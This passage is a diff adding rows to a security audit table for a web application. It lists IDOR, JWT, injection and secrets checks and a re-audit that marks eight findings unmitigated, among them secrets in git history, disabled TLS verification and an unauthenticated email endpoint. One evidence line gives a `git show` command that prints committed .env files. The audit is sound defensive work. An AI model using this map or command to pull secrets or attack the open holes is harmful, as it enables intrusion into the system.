+| IDOR / Session ownership — responses | FIND-01 path | `src/lib/middleware/requireSessionOwner.ts:73-98` — DB lookup + email comparison | SAFE |
+| IDOR / Session ownership — sessions | — | `src/lib/auth/requireSessionOwner.ts:23-43` + `sessionService.ts:200-203` | SAFE |
+| IDOR / Session ownership — submissions | — | `src/lib/middleware/requireSessionOwner.ts:65-98` | SAFE |
+| Auth bypass on dashboard routes | — | All 4 dashboard handlers checked for `requireSystemOwner` | SAFE |
+| JWT algorithm pinning | FIND-07 | `jwtVerify` in `requireSessionOwner.ts:54`, `config/route.ts:61` | LOW |
+| JWT secret source | — | `getJwtSecret()` in `authService.ts:7-10` | SAFE |
+| JWT secret length enforcement | — | No length check in code; `.env` has 41-char secret | No enforcement |
+| Secrets in committed files | FIND-01, FIND-02, FIND-08 | `git show a343e60 -- .env.local .env docker-compose.yml` | CRITICAL / HIGH |
+| TLS verification | FIND-03 | `src/lib/db.ts:24`, `.env.local:5`, `scripts/start.sh:7` | HIGH |
+| ORM injection (Drizzle) | — | All DB calls use parameterized Drizzle queries; raw SQL uses tagged `sql` template (parameterized) | SAFE |
+| Raw SQL in analyticsService | — | `q.id` values come from DB select of questions table, not user input | SAFE |
+| Answer payload validation | — | `PutResponsesBodySchema` Zod schema at route entry | SAFE |
+| Assessment closed enforcement | FIND-06 | `assessmentOpenGuard.ts:48-51` catch block | LOW |
+| Email endpoint auth | FIND-04 | `src/app/api/notifications/email/route.ts` — no auth import | MEDIUM |
+| Rate limiting | FIND-05 | Grep for `rateLimit`, `throttle`, middleware configs | None found |
+| Mass assignment / over-exposure | — | Dashboard service selects explicit columns; no `SELECT *` on sensitive tables | SAFE |
+| Path traversal | — | No `readFile` or `require(userInput)` patterns found | SAFE |
+| Content-Disposition injection | — | Filename uses server-generated date `new Date().toISOString()` | SAFE |
+| SSRF via email relay | — | `EMAIL_RELAY_URL` set by operator env, not user-supplied | Accepted risk |
+| `system_owner` bypass in HOF | — | `sessionService.getSessionById` re-checks `callerEmail !== respondent_email` | SAFE |
+| Re-audit: `.pivota/start-dev.sh` | P1 | All shell variables hardcoded or filesystem-derived; no external user input in expansions; no `eval`; CSPRNG for secret generation | SAFE |
+| Re-audit: `.pivota/uat-start.sh` | P2 | `$COMPOSE` is operator env (not external user input); `RUN_CMD` set to one of two hardcoded strings; `$PORT` only used in `fuser` within operator-controlled sandbox | SAFE |
+| Re-audit: `.pivota/dev-script.meta.json` | P3 | Static JSON metadata; never executed | SAFE |
+| Re-audit: FIND-01 mitigation check | FIND-01 | `.gitignore` still has no `.env.local*` pattern; secrets remain in git history | UNMITIGATED |
+| Re-audit: FIND-02 mitigation check | FIND-02 | `.gitignore` still has no `.env` pattern; dev secrets remain in git history | UNMITIGATED |
+| Re-audit: FIND-03 mitigation check | FIND-03 | `src/lib/db.ts:24` still reads `ssl: { rejectUnauthorized: false }` | UNMITIGATED |
+| Re-audit: FIND-04 mitigation check | FIND-04 | `src/app/api/notifications/email/route.ts` — no auth guard added | UNMITIGATED |
+| Re-audit: FIND-05 mitigation check | FIND-05 | No rate-limiting middleware found | UNMITIGATED |
+| Re-audit: FIND-06 mitigation check | FIND-06 | `assessmentOpenGuard.ts:48-51` catch still returns `{ ok: true }` | UNMITIGATED |
+| Re-audit: FIND-07 mitigation check | FIND-07 | `requireSessionOwner.ts:54` — `jwtVerify` still lacks `{ algorithms: ['HS256'] }` | UNMITIGATED |
+| Re-audit: FIND-08 mitigation check | FIND-08 | `.gitignore` still contains no `.env*` exclusion patterns | UNMITIGATED |
